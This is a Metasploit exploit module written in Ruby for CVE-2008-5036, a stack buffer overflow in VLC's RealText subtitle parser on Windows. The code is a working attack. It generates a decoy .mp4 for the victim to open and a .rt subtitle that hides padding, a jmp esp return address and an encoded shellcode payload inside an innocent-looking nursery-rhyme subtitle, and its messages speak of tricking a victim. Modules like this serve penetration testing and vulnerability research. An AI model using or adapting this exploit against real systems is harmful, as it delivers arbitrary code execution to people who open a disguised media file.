# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
    include Msf::Exploit::FILEFORMAT
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;VLC Media Player RealText Subtitle Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow vulnerability in
                VideoLAN VLC < 0.9.6. The vulnerability exists in the parsing of
                RealText subtitle files.
                    In order to exploit this, this module will generate two files:
                The .mp4 file is used to trick your victim into running. The .rt file
                is the actual malicious file that triggers the vulnerability, which
                should be placed under the same directory as the .mp4 file.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Tobias Klein&#039;,  # Vulnerability Discovery
                    &#039;SkD&#039;, # Exploit
                    &#039;juan vazquez&#039; # Metasploit Module
                ],
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;49809&#039; ],
                    [ &#039;CVE&#039;, &#039;2008-5036&#039; ],
                    [ &#039;BID&#039;, &#039;32125&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.trapkit.de/advisories/TKADV2008-011.txt&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.videolan.org/security/sa0810.html&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;          => 1900,
                    &#039;DisableNops&#039;    => true,
                    &#039;BadChars&#039;       => "\x00\x22\x0a",
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;VLC 0.9.4 on Windows XP SP3 / Windows 7 SP1&#039;,
                        {
                            &#039;Ret&#039; => 0x68f0cfad, # jmp esp # libqt4_plugin.dll
                            &#039;WritableAddress&#039; => 0x695d5890 # libqt4_plugin.dll .data
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Nov 05 2008&#039;,
            &#039;DefaultTarget&#039;  => 0))
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.rt&#039;]),
            ], self.class)
    end
    def generate_mp4
        mp4 = &#039;&#039;
        # ftyp
        mp4 << "\x00\x00\x00\x14"  #Size
        mp4 << "ftyp"              #Type
        mp4 << "isom"              #Major brand
        mp4 << "\x00\x00"          #version
        mp4 << "\x00\x00"
        mp4 << "mp41"              #Compatible brands
        # moov
        mp4 << "\x00\x00\x00\x9f"  #Size
        mp4 << "moov"              #Type
        mp4 << "\x00\x00\x00\x6c\x6d\x76\x68\x64\x00\x00\x00\x00\xcb\x75\xf1\xc2\xcb\x75\xf1\xc2"
        mp4 << "\x00\x01\x5f\x90\x00\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
        mp4 << "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        mp4 << "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00"
        mp4 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        mp4 << "\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x2b"
        mp4 << "udta"
        mp4 << "\x00\x00\x00\x23"
        mp4 << "\xa9\x65\x6e\x63\x00\x17\x00\x00"
        mp4 << "vlc 0.9.4 stream output"
        # wide
        mp4 << "\x00\x00\x00\x08"
        mp4 << "wide"
        # mdat
        mp4 << "\x00\x00\x00\x08"
        mp4 << "mdat"
        return mp4
    end
    def generate_rt
        my_payload = ""
        my_payload << Rex::Text.rand_text(72, payload_badchars)
        my_payload << [target.ret].pack("V") # EIP => jmp esp
        my_payload << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+8").encode_string # ESP => jmp after "Writable address"
        my_payload << Rex::Text.rand_text(2, payload_badchars)
        my_payload << [target[&#039;WritableAddress&#039;]].pack("V") # Writable address
        my_payload << payload.encoded
        rt_file = <<-eos
<window height="250" width="300" duration="15" bgcolor="yellow">
Mary had a little lamb,
<br/><time begin="#{my_payload}"/>
<br/><time begin="6"/>little lamb,
<br/><time begin="9"/>Mary had a little lamb
<br/><time begin="12"/>whose fleece was white as snow.
</window>
        eos
        return rt_file
    end
    def exploit
        mp4 = generate_mp4
        rt  = generate_rt
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039;. Put this file under the same directory as the mp4 file")
        file_create(rt)
        original_fname = datastore[&#039;FILENAME&#039;]
        datastore[&#039;FILENAME&#039;] = original_fname.scan(/(\w+).\w+/).flatten[0] + ".mp4"
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039;. This is the file your victim should open.")
        file_create(mp4)
        datastore[&#039;FILENAME&#039;] = original_fname
    end
end



